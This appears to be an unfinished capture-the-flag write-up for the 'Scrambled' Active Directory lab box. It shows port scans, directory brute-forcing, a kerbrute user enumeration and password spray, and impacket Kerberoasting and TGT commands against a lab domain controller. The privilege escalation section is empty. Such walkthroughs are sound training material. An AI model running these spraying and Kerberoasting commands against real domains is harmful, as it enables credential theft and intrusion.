---
description: 10-18-22
---

# Scrambled

<figure><img src="../../../.gitbook/assets/Scrambled.png" alt=""><figcaption></figcaption></figure>

## Information Gathering

Scanned all TCP ports:

```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Scramble Corp Intranet
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-10-18 20:55:00Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
|_ssl-date: 2022-10-18T20:56:19+00:00; -5s from scanner time.
| ssl-cert: Subject: commonName=DC1.scrm.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC1.scrm.local
| Not valid before: 2022-06-09T01:42:36
|_Not valid after:  2023-06-09T01:42:36
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC1.scrm.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC1.scrm.local
| Not valid before: 2022-06-09T01:42:36
|_Not valid after:  2023-06-09T01:42:36
|_ssl-date: 2022-10-18T20:56:19+00:00; -5s from scanner time.
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ssl-date: 2022-10-18T20:56:19+00:00; -5s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2022-10-18T20:47:19
|_Not valid after:  2052-10-18T20:47:19
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
|_ssl-date: 2022-10-18T20:56:19+00:00; -5s from scanner time.
| ssl-cert: Subject: commonName=DC1.scrm.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC1.scrm.local
| Not valid before: 2022-06-09T01:42:36
|_Not valid after:  2023-06-09T01:42:36
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC1.scrm.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC1.scrm.local
| Not valid before: 2022-06-09T01:42:36
|_Not valid after:  2023-06-09T01:42:36
|_ssl-date: 2022-10-18T20:56:19+00:00; -5s from scanner time.
Service Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| ms-sql-info: 
|   10.129.7.56:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| smb2-time: 
|   date: 2022-10-18T20:55:41
|_  start_date: N/A
|_clock-skew: mean: -5s, deviation: 0s, median: -5

4411/tcp  open  found?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, NCP, NULL, NotesRPC, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: 
|     SCRAMBLECORP_ORDERS_V1.0.3;
|   FourOhFourRequest, GetRequest, HTTPOptions, Help, LPDString, RTSPRequest, SIPOptions: 
|     SCRAMBLECORP_ORDERS_V1.0.3;
|_    ERROR_UNKNOWN_COMMAND;
5985/tcp  open  http       Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf     .NET Message Framing
49667/tcp open  msrpc      Microsoft Windows RPC
49673/tcp open  ncacn_http Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc      Microsoft Windows RPC
49700/tcp open  msrpc      Microsoft Windows RPC
49704/tcp open  msrpc      Microsoft Windows RPC
63672/tcp open  msrpc      Microsoft Windows RPC
```

Enumerated UDP ports:

```
```

Notes:

* Appears to be a Domain Controller due to the port schema
* <mark style="color:yellow;">53/DNS</mark> - <mark style="color:yellow;">scrm.local</mark> & <mark style="color:yellow;">DC1.scrm.local</mark>
  * Add to /etc/hosts
  * We get a DNS name and hostname
* <mark style="color:yellow;">80/http</mark> - We have a web server we need to go look at it
  * IIS, ASPX
* <mark style="color:yellow;">88/Kerberos</mark> - AS-REP if we get a user kerberoast if we get valid creds
* <mark style="color:yellow;">1433/mssql</mark> - Impacket-mssqlclient
* <mark style="color:yellow;">5985/WinRM</mark> - We can potentially WinRM into this
* <mark style="color:yellow;">4411/found?</mark> - Interesting port discovered on 4411 and being reported as found

## Enumeration

### Port 53 - DNS

Manual Zone Transfer:

<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

* This was done in an attempt to increase our attack surface

### Port 80 - HTTP (IIS/ASPX)

Dirsearch Forced Directory Browsing:

```
dirsearch -u http://10.129.7.56/


  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /home/xyconix/.dirsearch/reports/10.129.7.56/-_22-10-18_17-01-09.txt

Error Log: /home/xyconix/.dirsearch/logs/errors-22-10-18_17-01-09.log

Target: http://10.129.7.56/

[17:01:09] Starting: 
[17:01:10] 403 -  312B  - /%2e%2e//google.com                              
[17:01:15] 403 -  312B  - /\..\..\..\..\..\..\..\..\..\etc\passwd           
[17:01:20] 403 -    1KB - /assets/                                          
[17:01:20] 301 -  149B  - /assets  ->  http://10.129.7.56/assets/           
[17:01:27] 403 -    1KB - /images/                                          
[17:01:27] 301 -  149B  - /images  ->  http://10.129.7.56/images/           
[17:01:27] 200 -    2KB - /index.html                                       
[17:01:31] 200 -    2KB - /passwords.html                                   
[17:01:36] 200 -    2KB - /support.html                                     
                                                                             
Task Completed
```

* I notice a <mark style="color:yellow;">/passwords.html</mark>

<figure><img src="../../../.gitbook/assets/image (13).png" alt=""><figcaption><p>Easy win?</p></figcaption></figure>

* We need to find <mark style="color:yellow;">VALID usernames to be able to possibly exploit this</mark>
* <mark style="color:yellow;">Password will be the same as the username!</mark>
* /support.html

<figure><img src="../../../.gitbook/assets/image (41).png" alt=""><figcaption><p>Interesting find</p></figcaption></figure>

* NTLM authentication is supposedly disabled
* "This may cause problems for some of the programs that you use"
* Another interesting page was revealed on <mark style="color:yellow;">/supportrequest.html</mark>
* Did we find a possible user?

<figure><img src="../../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

* <mark style="color:yellow;">ksimpson</mark>
* If we remember above, we found out that usernames are going to be using the passwords!

### Port 88 - Kerberos

* We have a potential user above <mark style="color:yellow;">ksimpson</mark>
* <mark style="color:yellow;">I placed ksimpson in users.txt and ksimpson in passwords.txt</mark>
* We can validate the user with Kerbrute's userenum function

Userenum:

<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

<mark style="color:yellow;">ksimpson is a valid user!</mark>

Syntax for userenum:

```
./kerbrute_linux_amd64 userenum -d scrm.local users --dc 10.129.7.56
```

* Now we need to try and use passwordspray with ksimpson!

passwordspray:

```
./kerbrute_linux_amd64 passwordspray --dc DC1.scrm.local -d scrm.local users ksimpson
```

* We get valid credentials!

![](<../../../.gitbook/assets/image (40).png>)

### Port 4411 - Found?

* Strange port
* Associated with the directory found on <mark style="color:yellow;">/salesorder.html</mark>

<figure><img src="../../../.gitbook/assets/image (39).png" alt=""><figcaption><p>Preview</p></figcaption></figure>

Netcat Banner Grab:

```
nc -v 10.129.7.56 4411            Tue 18 Oct 2022 05:07:50 PM EDT
scrm.local [10.129.7.56] 4411 (?) open
SCRAMBLECORP_ORDERS_V1.0.3;
```

## Exploitation

### TGT Crafting & Kerberoasting

* After using Kerbrute to verify valid credentials, it is time to do some Kerberoasting since we now have valid credentials!
* Here, we are simply taking advantage of the nature of the Kerberos Authentication protocol
* If the Domain Admin had enforced stronger password requirements, it would have made our job a lot harder

Kerberoasting Attempt 1:

```
impacket-GetUserSPNs scrm.local/ksimpson:ksimpson -dc-ip 10.129.7.56 -k -request
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] exceptions must derive from BaseException
```

* Let's attempt to craft a TGT and then try again

TGT Crafting:

```
impacket-getTGT scrm.local/ksimpson:ksimpson
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Saving ticket in ksimpson.ccache
```

* You can see that the TGT was saved as <mark style="color:yellow;">ksimpson.ccache</mark>
* We can utilize <mark style="color:yellow;">klist</mark> to query information about it

Klist TGT Information:

```
klist ksimpson.ccache

Ticket cache: FILE:ksimpson.ccache
Default principal: ksimpson@SCRM.LOCAL

Valid starting       Expires              Service principal
10/18/2022 20:07:53  10/19/2022 06:07:53  krbtgt/SCRM.LOCAL@SCRM.LOCAL
        renew until 10/19/2022 20:07:58
```



## Privilege Escalation

### Local enumeration

### PrivEsc vector

## Proofs
